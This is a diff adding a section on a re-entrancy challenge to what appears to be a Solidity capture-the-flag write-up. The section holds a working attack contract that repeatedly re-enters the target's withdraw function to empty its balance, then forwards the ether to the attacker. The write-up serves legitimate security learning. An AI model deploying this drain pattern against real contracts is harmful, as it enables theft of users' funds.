@@ -114,3 +114,35 @@ fallback() external payable {
     revert("I'm the only KING");
 }
 ```
+# 10. Re-entrancy
+* Here we can take advantage of the withdraw function because it modify our balances in the last line.
+* Using our recieve function to make the withdraw function to be called in a loop before modifying our balances we can empty the funds of this target contract.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Reentrance.sol"; // When using Remix, either get rid of the safemath import or use the url from the OZ repo. 
+
+contract ReAttack {
+    Reentrance Target;
+
+    constructor(address payable _target) {
+        Target = Reentrance(_target);
+    }
+
+    function Attack() external payable {
+        Target.donate{value: address(Target).balance + 1}(address(this)); // Target.balance = 1000000000000000 
+        Target.withdraw(1000000000000001); // Hardcoded the value that we sent above 
+    }
+
+    receive() external payable{
+        if (address(Target).balance > 0) {
+            Target.withdraw(address(Target).balance);
+        }
+    }
+
+    function Sent(address payable _me) external payable {   // To sent all the funds back into our wallet
+       _me.transfer(address(this).balance); 
+    }
+}
+```
